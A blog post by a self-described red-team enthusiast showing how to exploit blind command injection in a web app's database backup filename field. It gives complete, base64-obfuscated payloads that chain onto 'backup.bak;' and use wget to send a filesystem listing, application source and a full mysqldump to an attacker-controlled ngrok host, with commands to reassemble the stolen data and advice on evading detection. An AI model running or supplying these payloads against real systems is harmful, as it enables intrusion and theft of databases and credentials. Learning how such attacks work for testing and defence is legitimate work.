---
layout: post
title: Exfiltrating Data via Wget though a Blind Command injection
date: 2025-04-05
categories: [blog]
tags: [exfiltration, blind, commandinjection, wget]
---

# Exfiltrating Data via Wget though a Blind Command injection
![image](https://hackmd.io/_uploads/SymepiyW1x.png)

## Introduction
Hello, I’m cyb4x, a Red Team enthusiast with a focus on offensive security tactics. In this article, we’ll explore one such method: exfiltrating data using wget through blind command injection vulnerabilities. When a target system reveals a command injection flaw, it opens the door to remote code execution (RCE) without the need for complex exploits. I’ll walk you through the process of using wget to locate and extract valuable files, navigate the filesystem, and even access database contents, all while flying under the radar.

## Blind Command Injection
### What is Blind Command Injection?
Blind command injection is a security vulnerability that allows an attacker to execute arbitrary commands on a server, despite not receiving direct feedback or output from those commands. Unlike standard command injection, where the attacker sees the results of each command they execute, blind command injection requires creativity and patience, as there’s no immediate confirmation that a command succeeded or failed. Attackers often rely on side effects, such as delays or HTTP responses, to infer the success of their actions, making it challenging but achievable to navigate and exploit.

### Identifying Command Injection (Blind) Vulnerabilities
Command injection vulnerabilities typically arise when an application improperly handles user input, passing it directly into a command executed on the operating system without proper sanitization. An attacker might identify this type of vulnerability by testing inputs with symbols like ;, &&, or |, which can chain or initiate additional commands. If the application is vulnerable to blind injection, it may not display the output, but other observable indicators like server delays or altered responses may hint that commands are being processed in the background. Careful testing, including trial commands that generate a detectable result (e.g., adding a delay with sleep), can help to confirm the existence of blind injection.

![image](https://hackmd.io/_uploads/SJ00b2kZJl.png)

As an attacker, discovering a database backup feature that lets administrators specify a filename is highly intriguing, as it likely involves system-level command execution to generate and store the database dump. Typically, these backups are created using commands like `mysqldump` or `pg_dump`, followed by writing the output to a specified file path. This interaction with the system hints at a possible command injection vulnerability, especially if the filename input is unsanitized and directly inserted into the command.

### Leveraging Blind Injection for Remote Code Execution (RCE)
After noticing that the application’s backup feature accepts a filename as input, I decided to test for command injection by manipulating this input. Using Burp Suite’s Repeater, I captured the HTTP request responsible for triggering the backup. Then inject a simple sleep command (e.g., `sleep 30`) into the filename field, chaining it with a command separator like `;, &&, or |` to test if additional commands are executed. The server takes noticeably longer to respond around 30 seconds, in this case this delay suggests that the sleep command ran successfully, confirming blind command injection.

![image](https://hackmd.io/_uploads/HkiSPnyWyx.png)

## Configuring a Server to Receive Exfiltrated Data
To exfiltrate data from a compromised system, we’ll set up a PHP server on our attacking machine and use Ngrok to make it accessible over the internet. This allows us to receive files that wget retrieves from the target system via command injection.

Starting a PHP Server

```
php -S 0.0.0.0:8888 -t .
```
![image](https://hackmd.io/_uploads/HJ_Hqn1bJe.png)

Port Forwarding with Ngrok

```
ngrok http 127.0.0.1:8888
```

![image](https://hackmd.io/_uploads/rJe1s3kb1g.png)

### Wget utility
wget is a command-line utility used to download files from the internet, commonly found on Linux systems. It supports `HTTP, HTTPS, and FTP` protocols, making it versatile for fetching files from various sources. While typically used to retrieve content from the web, wget also has powerful options that can be creatively leveraged for exfiltration and data transfers. You can learn more about wget [here](https://www.cbtnuggets.com/blog/technology/system-admin/what-is-wget-in-linux)

`wget` can be adapted to upload files to a remote server using the `--post-file` option. This option sends a file from the target machine to a specified URL, which can then be captured by a listening server. With command injection, `wget` can be used to pull sensitive files from a compromised system and send them to a remote location without requiring direct interaction with the target. This makes wget an effective tool for stealthy data exfiltration.

Testing our server
```
wget http://0b0e-41-74-120-172.ngrok-free.app/test.txt
```
![image](https://hackmd.io/_uploads/H1ZW331WJe.png)

![image](https://hackmd.io/_uploads/B1pM2nkZyl.png)


## Navigating and Exploring the Filesystem
In the process of exfiltrating sensitive data from a compromised system, effectively mapping the filesystem is a crucial step foran attacker seeking to uncover valuable information. 

Using this command which systematically enumerate the contents of the root filesystem, encode that information in Base64 to obfuscate it, and send each encoded line to a remote server using wget. This approach can be part of an exfiltration strategy, allowing an attacker to stealthily transfer sensitive filesystem information without raising immediate alarms. The use of Base64 encoding helps reduce the likelihood of detection in network traffic by making the transmitted data less readable.

Initial command
```
ls -la / | base64 | while read line; do wget "http://0b0e-41-74-120-172.ngrok-free.app/${line}"; done
```
base64 encoded command
```
bHMgLWxhIC8gfCBiYXNlNjQgfCB3aGlsZSByZWFkIGxpbmU7IGRvIHdnZXQgImh0dHA6Ly8wYjBlLTQxLTc0LTEyMC0xNzIubmdyb2stZnJlZS5hcHAvJHtsaW5lfSI7IGRvbmU=
```

Final Payload
`backup.bak;` initiates an attempt to create a backup while allowing multiple commands to be executed sequentially using a `semicolon`. Next, the echo command outputs a Base64 encoded initial payload, This output is piped into `base64 -d`, decoding it back to its original form for execution. Finally, the command is run via the shell (`sh`), allowing  arbitrary commands execution on the server without any direct feedback.

```
backup.bak; echo bHMgLWxhIC8gfCBiYXNlNjQgfCB3aGlsZSByZWFkIGxpbmU7IGRvIHdnZXQgImh0dHA6Ly8wYjBlLTQxLTc0LTEyMC0xNzIubmdyb2stZnJlZS5hcHAvJHtsaW5lfSI7IGRvbmU= | base64 -d | sh
```
Saving the output of PHP server to the file.
```
php -S 0.0.0.0:8888 -t . > filesystem.log 2>&1
```

![image](https://hackmd.io/_uploads/S1OumpJWyg.png)

This is how the request made from the victim server to our Ngrok and PHP server looks like
![image](https://hackmd.io/_uploads/SkGIXTy-kx.png)



![image](https://hackmd.io/_uploads/rJ6r4pybke.png)

Using this command we can processes a log file (`filesystem.log`) that contains HTTP request entries, extracting the paths of all GET requests, cleaning them up by removing newlines and slashes, and finally formatting the output to prepare it for Base64 decoding.The overall result will be a decoded string that represents the concatenated paths of all GET requests made which is the output of the command we sent (`ls -la`)

[more details](https://explainshell.com/explain?cmd=sed+-n+%27s%2F.*GET+%5C%28%5B%5E+%5D*%5C%29+-+.*%2F%5C1%2Fp%27+filesystem.log+%7C+tr+-d+%27%5Cn%27+%7C+tr+-d+%27%2F%27+%7C+sed+%27s%2F+%2F%5C%5Cn%2Fg%27+%7C+base64+-d)


```
sed -n 's/.*GET \([^ ]*\) - .*/\1/p' filesystem.log | tr -d '\n' | tr -d '/' | sed 's/ /\\n/g' | base64 -d
```
![image](https://hackmd.io/_uploads/r1ACNp1bkx.png)


## Exfiltrating the Database
Now we can use wget to again to exifiltrate application files which might conatin sensitive informations like database configurations.

```
cat /app/main.py | base64  | while read line; do wget "http://0b0e-41-74-120-172.ngrok-free.app/${line}"; done
```

```
Y2F0IC9hcHAvaGVsbG8ucHkgfCBiYXNlNjQgIHwgd2hpbGUgcmVhZCBsaW5lOyBkbyB3Z2V0ICJodHRwOi8vMGIwZS00MS03NC0xMjAtMTcyLm5ncm9rLWZyZWUuYXBwLyR7bGluZX0iOyBkb25l
```

```
backup.bak; echo Y2F0IC9hcHAvaGVsbG8ucHkgfCBiYXNlNjQgIHwgd2hpbGUgcmVhZCBsaW5lOyBkbyB3Z2V0ICJodHRwOi8vMGIwZS00MS03NC0xMjAtMTcyLm5ncm9rLWZyZWUuYXBwLyR7bGluZX0iOyBkb25l | base64 -d | sh
```

![image](https://hackmd.io/_uploads/rySjZC1-ke.png)


```
sed -n 's/.*GET \([^ ]*\) - .*/\1/p' main.log | tr -d '\n' | tr -d '/' | sed 's/ /\\n/g' | base64 -d > main.py
```
Exifiltrated `main.py`

```
from flask import Flask
from flask import request,render_template,redirect,session,url_for,flash,make_response,abort
import sqlite3
from functools import wraps
import hashlib
import os
import subprocess
from flask_mysqldb import MySQL
import re

app = Flask(__name__)

app.config['MYSQL_HOST'] = '[REDACTED]'
app.config['MYSQL_USER'] = '[REDACTED]'
app.config['MYSQL_PASSWORD'] = '[REDACTED]'
app.config['MYSQL_DB'] = '[REDACTED]'

<!---------- SNIP --------------->
    return redirect(url_for('admin'))
```

## Database Exfiltration Techniques

```
mysqldump -h [DB_HOST] -u [DB_USERNAME] -p[DB_PASS] [DB_NAME] | base64  | while read line; do wget "http:///e794-41-74-120-172.ngrok-free.app/${line}"; done%
```
```
bXlzcWxkdW1wIC1oIGRiIC11IGNoYXJiZWwgLXBQQHNzdzByZDEyMzQgZmxhc2sgfCBiYXNlNjQgIHwgd2hpbGUgcmVhZCBsaW5lOyBkbyB3Z2V0ICJodHRwOi8vL2U3OTQtNDEtNzQtMTIwLTE3Mi5uZ3Jvay1mcmVlLmFwcC8ke2xpbmV9IjsgZG9uZQ==
```
```
backup.bak; echo bXlzcWxkdW1wIC1oIGRiIC11IGNoYXJiZWwgLXBQQHNzdzByZDEyMzQgZmxhc2sgfCBiYXNlNjQgIHwgd2hpbGUgcmVhZCBsaW5lOyBkbyB3Z2V0ICJodHRwOi8vL2U3OTQtNDEtNzQtMTIwLTE3Mi5uZ3Jvay1mcmVlLmFwcC8ke2xpbmV9IjsgZG9uZQ== | base64 -d | sh
```

![image](https://hackmd.io/_uploads/rJR19Jxb1e.png)

![image](https://hackmd.io/_uploads/BkQC9Jx-ye.png)


![image](https://hackmd.io/_uploads/r1-nY1lbJl.png)
